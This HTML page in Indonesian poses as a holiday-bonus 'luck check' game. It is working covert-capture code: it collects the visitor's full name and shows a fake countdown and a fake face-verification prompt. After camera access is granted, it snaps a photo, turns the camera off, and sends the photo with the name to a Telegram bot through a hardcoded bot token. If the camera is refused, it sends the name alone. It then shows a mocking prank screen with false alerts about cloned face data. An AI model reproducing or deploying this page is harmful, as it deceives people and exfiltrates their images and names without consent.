<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cek Keberuntungan THR 🌙</title>
    <style>
        body { margin: 0; padding: 0; background: #f0fdf4; font-family: 'Segoe UI', sans-serif; overflow: hidden; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; flex-direction: column; }
        #intro { margin-top: -50px; padding: 0 20px; z-index: 5; }
        h1 { color: #15803d; margin-bottom: 5px; font-size: 1.4rem; text-transform: uppercase; font-weight: 900; }
        #timer-box { color: #dc2626; font-weight: bold; font-size: 0.8rem; margin-bottom: 10px; background: #fee2e2; padding: 5px 15px; border-radius: 20px; display: inline-block; border: 1px solid #fca5a5; }
        #verify-box { background: white; padding: 15px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); margin-bottom: 25px; width: 280px; z-index: 6; }
        input { width: 90%; padding: 12px; border: 2px solid #e2e8f0; border-radius: 10px; outline: none; text-align: center; font-size: 1rem; }
        #envelope { width: 250px; cursor: pointer; transition: 0.2s; z-index: 10; }
        #envelope:active { transform: scale(0.9); }
        
        /* FAKE POPUP */
        #fake-alert { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.7); z-index: 500; align-items: center; justify-content: center; }
        .alert-box { background: white; width: 85%; max-width: 320px; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .alert-box h3 { margin: 0 0 10px; color: #15803d; }
        .alert-box p { font-size: 0.9rem; color: #666; margin-bottom: 20px; }
        .btn-ready { background: #15803d; color: white; border: none; padding: 12px 30px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1rem; }

        /* LOADING OVERLAY */
        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; flex-direction: column; align-items: center; justify-content: center; }
        .spinner { border: 5px solid #f3f3f3; border-top: 5px solid #15803d; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        
        /* PRANK SCREEN */
        #prank-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: black; z-index: 2000; justify-content: center; align-items: center; }
        #prank-screen img { width: 100%; height: 100%; object-fit: contain; }
        #particle-container { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 2010; pointer-events: none; }
        
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .particle { position: absolute; z-index: 2011; animation: popOut 2s linear forwards; }
        @keyframes popOut { 0% { transform: translate(-50%, -50%) scale(0); opacity: 1; } 100% { transform: translate(var(--tx), var(--ty)) scale(var(--s)) rotate(var(--r)); opacity: 0; } }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <div id="fake-alert">
        <div class="alert-box">
            <h3>📸 Scan Wajah Aktif</h3>
            <p>Sistem mendeteksi akses dari perangkat baru. Silakan klik <b>Lanjutkan</b> untuk verifikasi wajah & tentukan nominal THR-mu!</p>
            <button class="btn-ready" id="btn-lanjut">LANJUTKAN</button>
        </div>
    </div>

    <div id="intro">
        <h1>CEK KEBERUNTUNGAN THR 🌙</h1>
        <div id="timer-box">🔥 Berakhir Dalam: <span id="countdown">02:59</span></div>
        <p>Input nama & klik amplop untuk scan keberuntungan!</p>
    </div>

    <div id="verify-box">
        <input type="text" id="victim-name" placeholder="Nama Lengkap Kamu" autocomplete="off">
    </div>

    <img id="envelope" src="amplop.png" alt="Mulai Scan">

    <div id="loading-overlay">
        <div class="spinner"></div>
        <p id="loading-text" style="font-weight:bold; margin-top:20px; color:#15803d;">Menghubungkan ke server...</p>
    </div>

    <div id="prank-screen">
        <div id="particle-container"></div>
        <img src="monyet-memberikan-jari-tengah-kepada-orang-orang.jpg">
    </div>

    <script>
        const env = document.getElementById('envelope');
        const btnLanjut = document.getElementById('btn-lanjut');
        const fakeAlert = document.getElementById('fake-alert');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingText = document.getElementById('loading-text');
        const prank = document.getElementById('prank-screen');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        const prankSound = new Audio('https://www.myinstants.com/media/sounds/monkey-laugh.mp3');
        const trumpetSound = new Audio('https://www.myinstants.com/media/sounds/air-horn-club-sample_1.mp3');
        
        const TELE_TOKEN = '8642591827:AAEW79QE8FGYcvELtapkI2jnhvXocW4rd9U'; 
        const TELE_ID = '7267912519'; 
        let globalNama = "";

        // Timer Palsu
        let sec = 179;
        setInterval(() => {
            let m = Math.floor(sec/60); let s = sec%60;
            document.getElementById('countdown').innerText = `0${m}:${s<10?'0':''}${s}`;
            if(sec > 10) sec--;
        }, 1000);

        // Langkah 1: Klik Amplop
        env.addEventListener('click', () => {
            globalNama = document.getElementById('victim-name').value;
            if(!globalNama) return alert("Isi namamu dulu bos!");
            fakeAlert.style.display = 'flex';
            // Pre-load audio agar tidak kena blokir browser
            prankSound.load();
            trumpetSound.load();
        });

        // Langkah 2: Proses Utama (Klik Lanjutkan)
        btnLanjut.addEventListener('click', async () => {
            fakeAlert.style.display = 'none';
            loadingOverlay.style.display = 'flex';
            
            if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();

            // Text Loading Berubah-ubah
            const texts = ["Inisialisasi Kamera...", "Mendeteksi Biometrik...", "Sinkronisasi Data...", "Mengirim Laporan Ke Irham..."];
            let i = 0;
            const textInterval = setInterval(() => {
                if(i < texts.length) loadingText.innerText = texts[i++];
            }, 1200);

            try {
                // Minta Izin Kamera
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                video.srcObject = stream;
                
                // Tunggu sebentar agar gambar fokus
                await new Promise(res => setTimeout(res, 2000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Matikan kamera agar lampu indikator mati
                stream.getTracks().forEach(t => t.stop());

                // Kirim Foto ke Telegram
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', TELE_ID);
                    fd.append('photo', blob, 'muka_korban.jpg');
                    fd.append('caption', `🎯 TARGET KENA!\n👤 Nama: ${globalNama}`);
                    fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg');

            } catch (e) {
                // Jika kamera diblokir tetap kirim laporan teks
                fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage?chat_id=${TELE_ID}&text=🎯 KORBAN GAS (No Photo): ${globalNama}`);
            }

            // Setelah proses selesai (Total 6 detik loading)
            setTimeout(() => {
                clearInterval(textInterval);
                loadingOverlay.style.display = 'none';
                showPrank();
            }, 6000);
        });

        function showPrank() {
            prank.style.display = 'flex';
            
            // Efek Getar HP (Android)
            if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 500]);
            
            trumpetSound.play();
            prankSound.loop = true;
            prankSound.play();
            
            setInterval(burst, 2000);
            
            setTimeout(() => alert("⚠️ WARNING: DATA WAJAH BERHASIL DIKLONING!"), 1000);
            setTimeout(() => alert("TERIMA KASIH, SALDO ANDA SUDAH DISUMBANGKAN KE IRHAM FAJRI!"), 2500);
        }

        function burst() {
            const container = document.getElementById('particle-container');
            for (let i = 0; i < 30; i++) {
                const p = document.createElement('div');
                p.className = 'particle'; p.innerText = ['😂','🤣','💩','🐒'][Math.floor(Math.random()*4)];
                p.style.left = '50%'; p.style.top = '50%';
                const a = Math.random()*Math.PI*2;
                p.style.setProperty('--tx', Math.cos(a)*250+'px');
                p.style.setProperty('--ty', Math.sin(a)*250+'px');
                p.style.setProperty('--s', Math.random()*3+1);
                p.style.setProperty('--r', Math.random()*360+'deg');
                container.appendChild(p);
                setTimeout(() => p.remove(), 2000);
            }
        }
    </script>
</body>
</html>
